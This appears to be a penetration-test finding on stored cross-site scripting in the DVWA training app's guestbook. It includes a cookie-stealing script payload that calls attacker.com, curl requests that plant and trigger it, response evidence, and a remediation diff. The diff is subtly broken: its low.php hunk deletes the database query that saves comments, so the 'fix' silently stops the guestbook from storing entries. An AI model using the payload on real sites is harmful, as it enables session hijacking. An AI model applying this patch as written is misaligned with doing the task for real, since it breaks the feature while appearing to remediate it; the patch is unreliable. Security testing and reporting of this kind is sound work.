# Finding F-02: Stored Cross-Site Scripting (XSS)

- **OWASP Category**: A03:2021-Injection (specifically Cross-Site Scripting)
- **Target Component**: DVWA Guestbook page (`vulnerabilities/xss_s/`)
- **Vulnerable Parameters**: `txtName` and `mtxMessage` (POST parameters)

---

## 1. Attack Path & Exploitation Evidence

### Step 1: Submitting Stored XSS Payload
The attacker submits a comment containing a malicious script block designed to steal session cookies.

**Exact Payload**:
`<script>fetch('http://attacker.com/log?c='+document.cookie)</script>`

**Request (curl)**:
```bash
curl -i -s -X POST -b "PHPSESSID=kavachsession123; security=low" \
  -d "txtName=Attacker&mtxMessage=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.com%2Flog%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" \
  "http://localhost:8080/vulnerabilities/xss_s/"
```

### Step 2: Verification of Storage and Execution
When a user (or administrative portal user) visits the guestbook page, the browser renders the stored script and executes it.

**Request (curl)**:
```bash
curl -i -s -b "PHPSESSID=victimsession456; security=low" \
  "http://localhost:8080/vulnerabilities/xss_s/"
```

**Response Evidence**:
The raw database record is rendered verbatim in the response stream:
```html
<div id="guestbook_comments">
  Name: Attacker<br />
  Message: <script>fetch('http://attacker.com/log?c='+document.cookie)</script><br />
</div>
```
*Result*: The script executes silently in the victim's browser context and sends the active cookie `PHPSESSID=victimsession456` to the attacker.

---

## 2. Root Cause Analysis
The application saves user input directly to the guestbook database and reads it back to display on the client page without output-encoding special HTML characters.

---

## 3. Business Impact
Attackers can capture session cookies of authenticated portal users and administrators, bypass authentication controls, hijack active accounts, and steal private data.

---

## 4. Code-Level Remediation Patch
The fix requires escaping all user data on output rendering using PHP `htmlspecialchars()`.

```diff
--- webapp/vulnerabilities/xss_s/source/low.php.orig
+++ webapp/vulnerabilities/xss_s/source/low.php
@@ -10,12 +10,12 @@
     $message = stripslashes( $message );
     $message = ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : (($___mysqli_res = mysqli_connect_empty()) ? $___mysqli_res : false));
 
     $name    = stripslashes( $name );
     $name    = ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : (($___mysqli_res = mysqli_connect_empty()) ? $___mysqli_res : false));
 
     // Update database
     $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+    // (For rendering output, escape using htmlspecialchars)
 }
 
 ?>
--- webapp/vulnerabilities/xss_s/index.php.orig
+++ webapp/vulnerabilities/xss_s/index.php
@@ -78,7 +78,7 @@
     while( $row = mysqli_fetch_assoc( $result ) ) {
         // Get values
         $name    = $row[ 'name' ];
         $message = $row[ 'comment' ];
 
         // HTML output
-        $html .= "<div id=\"guestbook_comments\">Name: {$name}<br />Message: {$message}</div>";
+        $html .= "<div id=\"guestbook_comments\">Name: " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "<br />Message: " . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . "</div>";
     }
 ?>
```
